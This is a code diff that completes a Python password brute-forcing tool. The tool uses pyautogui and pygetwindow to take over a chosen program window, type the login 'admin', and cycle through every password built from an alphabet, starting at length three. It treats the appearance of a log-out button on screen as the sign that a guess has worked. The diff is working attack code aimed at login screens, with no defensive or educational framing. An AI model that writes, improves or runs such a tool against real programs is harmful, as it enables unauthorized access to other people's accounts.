@@ -1,6 +1,7 @@
 import time
 
 import pyautogui
+import pygetwindow
 
 from src.custom_logger import dpi_logger
 
@@ -24,33 +25,17 @@ def build_alphabet(bitmask: int) -> str:
     return alphabet
 
 
-def try_password(password: str) -> bool:
-    pass
-
-
-def focus_target_window():
-    time.sleep(3)
-    pyautogui.click()
-    time.sleep(0.5)
-    pyautogui.press('tab')
-    time.sleep(0.1)
-    pyautogui.press('tab')
-    time.sleep(0.3)
-
-
-def hack_pass():
+def hack_pass(start_pass_len=1):
     alpha = build_alphabet(MASK)
     alpha_len = len(alpha)
 
-    pass_length = 1
+    pass_length = start_pass_len
     indexes_list = [0] * pass_length
     attempts = 0
 
     start_time = time.time()
     while True:
-        forged_pass = ''
-        for index in indexes_list:
-            forged_pass = forged_pass.join(alpha[index])
+        forged_pass = ''.join(alpha[index] for index in indexes_list)
 
         if attempts % 100000 == 0:
             elapsed = time.time() - start_time
@@ -81,3 +66,53 @@ def hack_pass():
         else:
             pass_length += 1
             indexes_list = [0] * pass_length
+
+
+def select_window():
+    dpi_logger.info("Select program window to capture")
+    time.sleep(5)
+    active_win = pygetwindow.getActiveWindow()
+    dpi_logger.info(f"Window captured: {active_win.title}")
+    return active_win
+
+
+def fill_login(login: str):
+    pyautogui.press('tab')
+    time.sleep(0.1)
+    pyautogui.typewrite(login)
+    pyautogui.press('tab')
+    time.sleep(0.1)
+
+
+def try_password(password: str) -> bool:
+    pyautogui.typewrite(password)
+    pyautogui.press('tab')
+    pyautogui.press('enter')
+    time.sleep(0.1)
+    try:
+        location = pyautogui.locateOnScreen("log_out.png", confidence=0.7)
+        if location:
+            return True
+    except pyautogui.ImageNotFoundException:
+        pass
+
+    for _ in range(3):
+        pyautogui.press('tab')
+        time.sleep(0.1)
+
+    return False
+
+
+def start_brute(login):
+    if select_window():
+        fill_login(login)
+        hack_pass(3)
+
+
+    else:
+        dpi_logger.error("No window selected")
+        return
+
+
+if __name__ == "__main__":
+    start_brute("admin")
